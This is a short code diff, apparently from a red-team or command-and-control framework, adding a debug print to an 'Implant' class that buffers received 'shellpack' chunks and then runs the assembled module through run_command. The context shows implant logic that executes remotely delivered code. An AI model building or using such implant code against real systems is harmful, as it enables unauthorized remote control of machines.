@@ -35,6 +35,7 @@ class Implant(Host):
             self.module_cache += shellpack['data'].decode()
         elif shellpack['option'] == "COMPLETE":
             self.module_cache += shellpack['data'].decode()
+            print(shellpack['data'].decode())
             print(self.module_cache)
             self.run_command(self.module_cache)
             self.module_cache = """"""
